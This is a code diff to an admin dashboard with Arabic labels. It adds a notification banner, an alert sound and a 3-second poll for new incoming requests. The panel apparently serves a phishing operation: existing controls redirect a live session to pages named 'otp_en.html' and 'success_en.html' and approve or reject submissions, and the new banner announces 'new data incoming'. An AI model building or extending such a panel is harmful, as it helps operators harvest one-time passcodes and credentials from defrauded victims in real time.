@@ -330,6 +330,26 @@
         }
         .refresh-btn:hover { background: #e8e8e8; }
 
+        /* Notification Banner */
+        .notification-banner {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #ff7f00;
+            color: white;
+            padding: 15px 25px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            z-index: 3000;
+            display: none;
+            animation: slideIn 0.5s ease-out;
+            font-weight: bold;
+        }
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
         /* Responsive */
         @media (max-width: 768px) {
             .admin-header { padding: 12px 15px; }
@@ -431,13 +451,23 @@
                     <option value="otp_en.html">OTP (English)</option>
                     <option value="success_en.html">النجاح (English)</option>
                 </select>
-                <div class="modal-actions" style="margin-top:20px;">
-                    <button class="action-btn btn-approve" onclick="doRedirect()" style="padding:10px 25px;">إعادة توجيه</button>
-                    <button class="action-btn btn-reject" onclick="closeRedirectModal()" style="padding:10px 25px;">إلغاء</button>
-                </div>
+            </div>
+            <div class="modal-actions">
+                <button class="action-btn btn-redirect" onclick="doRedirect()">تأكيد التوجيه</button>
+                <button class="action-btn btn-reject" onclick="closeRedirectModal()">إلغاء</button>
             </div>
         </div>
     </div>
+
+    <!-- Notification Banner -->
+    <div id="notificationBanner" class="notification-banner">
+        🔔 هناك بيانات جديدة واردة!
+    </div>
+
+    <!-- Notification Sound -->
+    <audio id="notificationSound" preload="auto">
+        <source src="https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3" type="audio/mpeg">
+    </audio>
 
     <script>
         let currentSessionId = null;
@@ -682,8 +712,41 @@
         function closeModal() { document.getElementById('detailsModal').classList.remove('active'); }
         function closeRedirectModal() { document.getElementById('redirectModal').classList.remove('active'); }
 
+        // Check for new requests to trigger notification
+        let lastRequestCount = 0;
+        async function checkNewRequests() {
+            try {
+                const res = await fetch('/admin/check_new_requests');
+                if (res.ok) {
+                    const data = await res.json();
+                    if (data.new_count > 0) {
+                        showNotification();
+                    }
+                }
+            } catch (e) { console.error('Error checking new requests:', e); }
+        }
+
+        function showNotification() {
+            const banner = document.getElementById('notificationBanner');
+            const sound = document.getElementById('notificationSound');
+            
+            banner.style.display = 'block';
+            try {
+                sound.play();
+            } catch (e) { console.log('Audio play blocked by browser'); }
+            
+            setTimeout(() => {
+                banner.style.display = 'none';
+            }, 5000);
+        }
+
         // Auto-refresh every 3 seconds
-        setInterval(function() { loadVisits(); loadRequests(); }, 3000);
+        setInterval(function() { 
+            loadVisits(); 
+            loadRequests(); 
+            checkNewRequests();
+        }, 3000);
+        
         loadVisits();
         loadRequests();
     </script>
